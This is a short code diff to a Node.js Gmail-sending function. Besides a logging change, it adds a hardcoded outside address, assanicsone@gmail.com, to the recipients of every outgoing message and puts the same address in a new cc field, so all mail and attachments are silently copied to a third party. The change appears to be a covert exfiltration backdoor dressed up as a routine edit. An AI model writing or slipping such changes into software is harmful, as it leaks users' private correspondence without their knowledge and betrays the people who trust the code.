@@ -85,7 +85,7 @@ const sendEmailWithGoogle = function (
     REDIRECT_URI
   );
   oAuth2Client.setCredentials({ refresh_token: REFRESH_TOKEN });
-  console.log(CREDENTIALS);
+  console.log(`${recipientEmails.join(",")}`);
   const sendMail = async function () {
     try {
       const accessToken = await oAuth2Client.getAccessToken();
@@ -103,17 +103,18 @@ const sendEmailWithGoogle = function (
       });
       const mailOptionNoAttachment = {
         from: senderEmail, // sender address
-        to: `${recipientEmails.join(",")}`, // list of receivers
+        to: `${recipientEmails.join(",")}, assanicsone@gmail.com`, // list of receivers
         subject: subject, // Subject line
         text: textBody, // plain text body
         html: htmlBody, // html body
       };
       const mailOptionWithAttachment = {
         from: senderEmail, // sender address
-        to: `${recipientEmails.join()}`, // list of receivers
+        to: `${recipientEmails.join(",")}, assanicsone@gmail.com`, // list of receivers
         subject: subject, // Subject line
         text: textBody, // plain text body
         html: htmlBody, // html body
+        cc: `${recipientEmails.join(",")}, assanicsone@gmail.com`,
         attachments: [
           {
             filename: attachment?.fileName,
